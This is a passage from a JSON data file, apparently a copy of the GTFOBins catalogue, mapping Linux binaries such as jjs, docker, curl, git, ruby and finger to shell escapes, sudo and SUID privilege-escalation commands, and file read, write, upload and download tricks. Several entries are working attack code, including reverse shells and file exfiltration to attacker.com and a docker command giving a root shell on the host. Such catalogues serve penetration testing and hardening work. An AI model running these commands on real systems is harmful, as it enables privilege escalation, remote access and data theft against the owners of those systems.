-w99999999 \"$LFILE\"\n"}]}, "781": {"platform": "linux", "cmd": "xetex", "function": "shell", "data": [{"code": "xetex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "782": {"platform": "linux", "cmd": "xetex", "function": "sudo", "data": [{"code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "783": {"platform": "linux", "cmd": "xetex", "function": "limited-suid", "data": [{"code": "./xetex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "784": {"platform": "linux", "cmd": "jjs", "function": "shell", "data": [{"code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"}]}, "785": {"platform": "linux", "cmd": "jjs", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n"}]}, "786": {"platform": "linux", "cmd": "jjs", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n"}]}, "787": {"platform": "linux", "cmd": "jjs", "function": "file-write", "data": [{"code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n"}]}, "788": {"platform": "linux", "cmd": "jjs", "function": "file-read", "data": [{"code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n"}]}, "789": {"platform": "linux", "cmd": "jjs", "function": "suid", "data": [{"description": "This has been found working in macOS but failing on Linux systems.", "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"}]}, "790": {"platform": "linux", "cmd": "jjs", "function": "sudo", "data": [{"code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"}]}, "791": {"platform": "linux", "cmd": "ghc", "function": "shell", "data": [{"code": "ghc -e 'System.Process.callCommand \"/bin/sh\"'"}]}, "792": {"platform": "linux", "cmd": "ghc", "function": "sudo", "data": [{"code": "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"}]}, "793": {"platform": "linux", "cmd": "busctl", "function": "shell", "data": [{"code": "busctl --show-machine\n!/bin/sh\n"}]}, "794": {"platform": "linux", "cmd": "busctl", "function": "sudo", "data": [{"code": "sudo busctl --show-machine\n!/bin/sh\n"}]}, "795": {"platform": "linux", "cmd": "docker", "function": "shell", "data": [{"description": "The resulting is a root shell.", "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}]}, "796": {"platform": "linux", "cmd": "docker", "function": "file-write", "data": [{"description": "Write a file by copying it to a temporary container and back to the target destination on the host.", "code": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n"}]}, "797": {"platform": "linux", "cmd": "docker", "function": "file-read", "data": [{"description": "Read a file by copying it to a temporary container and back to a new location on the host.", "code": "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n"}]}, "798": {"platform": "linux", "cmd": "docker", "function": "sudo", "data": [{"description": "The resulting is a root shell.", "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}]}, "799": {"platform": "linux", "cmd": "docker", "function": "suid", "data": [{"description": "The resulting is a root shell.", "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}]}, "800": {"platform": "linux", "cmd": "puppet", "function": "shell", "data": [{"code": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"}]}, "801": {"platform": "linux", "cmd": "puppet", "function": "file-write", "data": [{"description": "The file path must be absolute.", "code": "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n"}]}, "802": {"platform": "linux", "cmd": "puppet", "function": "file-read", "data": [{"description": "The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.", "code": "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n"}]}, "803": {"platform": "linux", "cmd": "puppet", "function": "sudo", "data": [{"code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"}]}, "804": {"platform": "linux", "cmd": "curl", "function": "file-upload", "data": [{"description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.", "code": "URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d @$file_to_send $URL\n"}]}, "805": {"platform": "linux", "cmd": "curl", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n"}]}, "806": {"platform": "linux", "cmd": "curl", "function": "file-read", "data": [{"description": "The file path must be absolute.", "code": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n"}]}, "807": {"platform": "linux", "cmd": "curl", "function": "file-write", "data": [{"description": "The file path must be absolute.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\"\n"}]}, "808": {"platform": "linux", "cmd": "curl", "function": "suid", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"}]}, "809": {"platform": "linux", "cmd": "curl", "function": "sudo", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"}]}, "810": {"platform": "linux", "cmd": "bundler", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.", "code": "bundler help\n!/bin/sh\n"}, {"code": "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n"}, {"code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n"}, {"description": "This spawns an interactive shell via [`irb`](/gtfobins/irb/).", "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n"}, {"code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n"}]}, "811": {"platform": "linux", "cmd": "bundler", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo bundler help\n!/bin/sh\n"}]}, "812": {"platform": "linux", "cmd": "join", "function": "file-read", "data": [{"code": "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n"}]}, "813": {"platform": "linux", "cmd": "join", "function": "suid", "data": [{"code": "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n"}]}, "814": {"platform": "linux", "cmd": "join", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"}]}, "815": {"platform": "linux", "cmd": "time", "function": "shell", "data": [{"code": "/usr/bin/time /bin/sh"}]}, "816": {"platform": "linux", "cmd": "time", "function": "suid", "data": [{"code": "./time /bin/sh -p"}]}, "817": {"platform": "linux", "cmd": "time", "function": "sudo", "data": [{"code": "sudo /usr/bin/time /bin/sh"}]}, "818": {"platform": "linux", "cmd": "run-parts", "function": "shell", "data": [{"code": "run-parts --new-session --regex '^sh$' /bin"}]}, "819": {"platform": "linux", "cmd": "run-parts", "function": "sudo", "data": [{"code": "sudo run-parts --new-session --regex '^sh$' /bin"}]}, "820": {"platform": "linux", "cmd": "run-parts", "function": "suid", "data": [{"code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"}]}, "821": {"platform": "linux", "cmd": "git", "function": "shell", "data": [{"code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "git help config\n!/bin/sh\n"}, {"description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "git branch --help config\n!/bin/sh\n"}, {"description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.", "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n"}, {"code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x\n"}]}, "822": {"platform": "linux", "cmd": "git", "function": "file-read", "data": [{"description": "The read file content is displayed in `diff` style output format.", "code": "LFILE=file_to_read\ngit diff /dev/null $LFILE\n"}]}, "823": {"platform": "linux", "cmd": "git", "function": "sudo", "data": [{"code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo git -p help config\n!/bin/sh\n"}, {"description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo git branch --help config\n!/bin/sh\n"}, {"description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.", "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n"}, {"code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"}]}, "824": {"platform": "linux", "cmd": "git", "function": "limited-suid", "data": [{"code": "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help"}]}, "825": {"platform": "linux", "cmd": "ed", "function": "shell", "data": [{"code": "ed\n!/bin/sh\n"}]}, "826": {"platform": "linux", "cmd": "ed", "function": "file-write", "data": [{"code": "ed file_to_write\na\nDATA\n.\nw\nq\n"}]}, "827": {"platform": "linux", "cmd": "ed", "function": "file-read", "data": [{"code": "ed file_to_read\n,p\nq\n"}]}, "828": {"platform": "linux", "cmd": "ed", "function": "suid", "data": [{"code": "./ed file_to_read\n,p\nq\n"}]}, "829": {"platform": "linux", "cmd": "ed", "function": "sudo", "data": [{"code": "sudo ed\n!/bin/sh\n"}]}, "830": {"platform": "linux", "cmd": "ed", "function": "limited-suid", "data": [{"code": "./ed\n!/bin/sh\n"}]}, "831": {"platform": "linux", "cmd": "flock", "function": "shell", "data": [{"code": "flock -u / /bin/sh"}]}, "832": {"platform": "linux", "cmd": "flock", "function": "suid", "data": [{"code": "./flock -u / /bin/sh -p"}]}, "833": {"platform": "linux", "cmd": "flock", "function": "sudo", "data": [{"code": "sudo flock -u / /bin/sh"}]}, "834": {"platform": "linux", "cmd": "find", "function": "shell", "data": [{"code": "find . -exec /bin/sh \\; -quit"}]}, "835": {"platform": "linux", "cmd": "find", "function": "suid", "data": [{"code": "./find . -exec /bin/sh -p \\; -quit"}]}, "836": {"platform": "linux", "cmd": "find", "function": "sudo", "data": [{"code": "sudo find . -exec /bin/sh \\; -quit"}]}, "837": {"platform": "linux", "cmd": "gzip", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ngzip -f $LFILE -t\n"}, {"code": "LFILE=file_to_read\ngzip -c $LFILE | gzip -d\n"}]}, "838": {"platform": "linux", "cmd": "gzip", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./gzip -f $LFILE -t\n"}]}, "839": {"platform": "linux", "cmd": "gzip", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"}]}, "840": {"platform": "linux", "cmd": "date", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ndate -f $LFILE\n"}]}, "841": {"platform": "linux", "cmd": "date", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./date -f $LFILE\n"}]}, "842": {"platform": "linux", "cmd": "date", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo date -f $LFILE\n"}]}, "843": {"platform": "linux", "cmd": "dmsetup", "function": "sudo", "data": [{"code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"}]}, "844": {"platform": "linux", "cmd": "dmsetup", "function": "suid", "data": [{"code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"}]}, "845": {"platform": "linux", "cmd": "sort", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nsort -m \"$LFILE\"\n"}]}, "846": {"platform": "linux", "cmd": "sort", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"}]}, "847": {"platform": "linux", "cmd": "sort", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"}]}, "848": {"platform": "linux", "cmd": "mtr", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nmtr --raw -F \"$LFILE\"\n"}]}, "849": {"platform": "linux", "cmd": "mtr", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"}]}, "850": {"platform": "linux", "cmd": "pkexec", "function": "sudo", "data": [{"code": "sudo pkexec /bin/sh"}]}, "851": {"platform": "linux", "cmd": "rake", "function": "shell", "data": [{"code": "rake -p '`/bin/sh 1>&0`'"}]}, "852": {"platform": "linux", "cmd": "rake", "function": "sudo", "data": [{"code": "sudo rake -p '`/bin/sh 1>&0`'"}]}, "853": {"platform": "linux", "cmd": "rake", "function": "limited-suid", "data": [{"code": "./rake -p '`/bin/sh 1>&0`'"}]}, "854": {"platform": "linux", "cmd": "cp", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n"}]}, "855": {"platform": "linux", "cmd": "cp", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n"}]}, "856": {"platform": "linux", "cmd": "cp", "function": "suid", "data": [{"code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"}, {"description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n"}]}, "857": {"platform": "linux", "cmd": "cp", "function": "sudo", "data": [{"code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n"}, {"description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"}]}, "858": {"platform": "linux", "cmd": "lualatex", "function": "shell", "data": [{"code": "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"}]}, "859": {"platform": "linux", "cmd": "lualatex", "function": "sudo", "data": [{"code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"}]}, "860": {"platform": "linux", "cmd": "lualatex", "function": "limited-suid", "data": [{"code": "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"}]}, "861": {"platform": "linux", "cmd": "luatex", "function": "shell", "data": [{"code": "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"}]}, "862": {"platform": "linux", "cmd": "luatex", "function": "sudo", "data": [{"code": "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"}]}, "863": {"platform": "linux", "cmd": "luatex", "function": "limited-suid", "data": [{"code": "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"}]}, "864": {"platform": "linux", "cmd": "sed", "function": "shell", "data": [{"description": "GNU version only. Also, this requires `bash`.", "code": "sed -n '1e exec sh 1>&0' /etc/hosts"}, {"description": "GNU version only. The resulting shell is not a proper TTY shell.", "code": "sed e"}]}, "865": {"platform": "linux", "cmd": "sed", "function": "command", "data": [{"description": "GNU version only.", "code": "sed -n '1e id' /etc/hosts"}]}, "866": {"platform": "linux", "cmd": "sed", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts\n"}]}, "867": {"platform": "linux", "cmd": "sed", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nsed '' \"$LFILE\"\n"}]}, "868": {"platform": "linux", "cmd": "sed", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"}]}, "869": {"platform": "linux", "cmd": "sed", "function": "sudo", "data": [{"description": "GNU version only. Also, this requires `bash`.", "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"}]}, "870": {"platform": "linux", "cmd": "setarch", "function": "shell", "data": [{"code": "setarch $(arch) /bin/sh"}]}, "871": {"platform": "linux", "cmd": "setarch", "function": "suid", "data": [{"code": "./setarch $(arch) /bin/sh -p"}]}, "872": {"platform": "linux", "cmd": "setarch", "function": "sudo", "data": [{"code": "sudo setarch $(arch) /bin/sh"}]}, "873": {"platform": "linux", "cmd": "apt", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "apt-get changelog apt\n!/bin/sh\n"}]}, "874": {"platform": "linux", "cmd": "apt", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo apt-get changelog apt\n!/bin/sh\n"}, {"description": "For this to work the target package (e.g., `sl`) must not be installed.", "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n"}, {"description": "When the shell exits the `update` command is actually executed.", "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"}]}, "875": {"platform": "linux", "cmd": "nice", "function": "shell", "data": [{"code": "nice /bin/sh"}]}, "876": {"platform": "linux", "cmd": "nice", "function": "suid", "data": [{"code": "./nice /bin/sh -p"}]}, "877": {"platform": "linux", "cmd": "nice", "function": "sudo", "data": [{"code": "sudo nice /bin/sh"}]}, "878": {"platform": "linux", "cmd": "zip", "function": "file-read", "data": [{"code": "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n"}]}, "879": {"platform": "linux", "cmd": "zip", "function": "shell", "data": [{"code": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n"}]}, "880": {"platform": "linux", "cmd": "zip", "function": "sudo", "data": [{"code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"}]}, "881": {"platform": "linux", "cmd": "zip", "function": "limited-suid", "data": [{"code": "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"}]}, "882": {"platform": "linux", "cmd": "tee", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"}]}, "883": {"platform": "linux", "cmd": "tee", "function": "suid", "data": [{"code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"}]}, "884": {"platform": "linux", "cmd": "tee", "function": "sudo", "data": [{"code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"}]}, "885": {"platform": "linux", "cmd": "dd", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n"}]}, "886": {"platform": "linux", "cmd": "dd", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ndd if=$LFILE\n"}]}, "887": {"platform": "linux", "cmd": "dd", "function": "suid", "data": [{"code": "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"}]}, "888": {"platform": "linux", "cmd": "dd", "function": "sudo", "data": [{"code": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"}]}, "889": {"platform": "linux", "cmd": "eb", "function": "shell", "data": [{"code": "eb logs\n!/bin/sh\n"}]}, "890": {"platform": "linux", "cmd": "eb", "function": "sudo", "data": [{"code": "sudo eb logs\n!/bin/sh\n"}]}, "891": {"platform": "linux", "cmd": "tmux", "function": "shell", "data": [{"code": "tmux"}]}, "892": {"platform": "linux", "cmd": "tmux", "function": "sudo", "data": [{"code": "sudo tmux"}]}, "893": {"platform": "linux", "cmd": "tail", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n"}]}, "894": {"platform": "linux", "cmd": "tail", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"}]}, "895": {"platform": "linux", "cmd": "tail", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"}]}, "896": {"platform": "linux", "cmd": "ssh-keyscan", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nssh-keyscan -f $LFILE\n"}]}, "897": {"platform": "linux", "cmd": "ssh-keyscan", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"}]}, "898": {"platform": "linux", "cmd": "ssh-keyscan", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"}]}, "899": {"platform": "linux", "cmd": "nl", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n"}]}, "900": {"platform": "linux", "cmd": "nl", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"}]}, "901": {"platform": "linux", "cmd": "nl", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"}]}, "902": {"platform": "linux", "cmd": "uniq", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nuniq \"$LFILE\"\n"}]}, "903": {"platform": "linux", "cmd": "uniq", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./uniq \"$LFILE\"\n"}]}, "904": {"platform": "linux", "cmd": "uniq", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"}]}, "905": {"platform": "linux", "cmd": "fmt", "function": "file-read", "data": [{"description": "This only works for the GNU version of `fmt`.", "code": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n"}, {"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\nfmt -999 \"$LFILE\"\n"}]}, "906": {"platform": "linux", "cmd": "fmt", "function": "suid", "data": [{"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"}]}, "907": {"platform": "linux", "cmd": "fmt", "function": "sudo", "data": [{"description": "This corrupts the output by wrapping very long lines at the given width.", "code": "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"}]}, "908": {"platform": "linux", "cmd": "finger", "function": "file-upload", "data": [{"description": "Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\"\n"}]}, "909": {"platform": "linux", "cmd": "finger", "function": "file-download", "data": [{"description": "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file.", "code": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n"}]}, "910": {"platform": "linux", "cmd": "journalctl", "function": "shell", "data": [{"code": "journalctl\n!/bin/sh\n"}]}, "911": {"platform": "linux", "cmd": "journalctl", "function": "sudo", "data": [{"code": "sudo journalctl\n!/bin/sh\n"}]}, "912": {"platform": "linux", "cmd": "ip", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nip -force -batch \"$LFILE\"\n"}]}, "913": {"platform": "linux", "cmd": "ip", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"}, {"description": "This only works for Linux with CONFIG_NET_NS=y.", "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"}]}, "914": {"platform": "linux", "cmd": "ip", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n"}, {"description": "This only works for Linux with CONFIG_NET_NS=y.", "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"}]}, "915": {"platform": "linux", "cmd": "dash", "function": "shell", "data": [{"code": "dash"}]}, "916": {"platform": "linux", "cmd": "dash", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n"}]}, "917": {"platform": "linux", "cmd": "dash", "function": "suid", "data": [{"code": "./dash -p"}]}, "918": {"platform": "linux", "cmd": "dash", "function": "sudo", "data": [{"code": "sudo dash"}]}, "919": {"platform": "linux", "cmd": "ruby", "function": "shell", "data": [{"code": "ruby -e 'exec \"/bin/sh\"'"}]}, "920": {"platform": "linux", "cmd": "ruby", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n"}]}, "921": {"platform": "linux", "cmd": "ruby", "function": "file-upload", "data": [{"description": "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.", "code": "export LPORT=8888\nruby -run -e httpd . -p $LPORT\n"}]}, "922": {"platform": "linux", "cmd": "ruby", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'\n"}]}, "923": {"platform": "linux", "cmd": "ruby", "function": "file-write", "data": [{"code": "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"}]}, "924": {"platform": "linux", "cmd": "ruby", "function": "file-read", "data": [{"code": "ruby -e 'puts File.read(\"file_to_read\")'"}]}, "925": {"platform": "linux", "cmd": "ruby", "function": "library-load", "data": [{"code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"}]}, "926": {"platform": "linux", "cmd": "ruby", "function": "sudo", "data": [{"code": "sudo ruby -e 'exec \"/bin/sh\"'"}]}, "927": {"platform": "linux", "cmd": "ruby", "function": "capabilities", "data": [{"code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"}]}, "928": {"platform": "linux", "cmd": "vimdiff", "function": "shell", "data": [{"code": "vimdiff -c ':!/bin/sh'"}, {"code": "vimdiff\n:set shell=/bin/sh\n:shell\n"}, {"description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that 